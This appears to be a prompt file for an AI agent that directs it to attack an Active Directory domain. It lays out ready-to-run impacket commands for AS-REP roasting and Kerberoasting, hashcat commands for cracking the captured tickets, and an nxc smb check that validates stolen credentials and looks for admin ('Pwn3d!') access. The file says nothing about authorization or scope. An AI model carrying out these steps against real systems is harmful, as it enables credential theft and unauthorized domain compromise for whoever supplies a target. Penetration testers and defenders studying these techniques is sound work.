---
description: Kerberos attacks — AS-REP roasting and Kerberoasting
---

Run Kerberos attacks against domain target. Args: $ARGUMENTS
Expected: <DC-IP> <DOMAIN> [users.txt or user:pass]

Confirm we have the domain FQDN in /etc/hosts pointing at the DC first — Kerberos
tooling is picky about name resolution. Also make sure clock skew is small (Kerberos
fails if the host clock differs from the DC by >5 min): `sudo ntpdate <DC-IP>` or
`sudo rdate -n <DC-IP>` if needed.

## AS-REP Roasting (no creds needed — finds users with pre-auth disabled)
- With a user list:
  `impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -no-pass -dc-ip <DC-IP> -format hashcat -outputfile scans/asrep.txt`
- Crack with hashcat mode 18200:
  `hashcat -m 18200 scans/asrep.txt /usr/share/wordlists/rockyou.txt`

## Kerberoasting (needs any valid domain creds — finds service accounts)
- `impacket-GetUserSPNs <DOMAIN>/<user>:<pass> -dc-ip <DC-IP> -request -outputfile scans/kerberoast.txt`
- Crack with hashcat mode 13100:
  `hashcat -m 13100 scans/kerberoast.txt /usr/share/wordlists/rockyou.txt`

## After cracking
Record any recovered creds in notes.md and validate them:
`nxc smb <DC-IP> -u <user> -p <pass>`  (look for [+] and any Pwn3d! marker)

Explain each result plainly — which account, what it grants, what to try next.
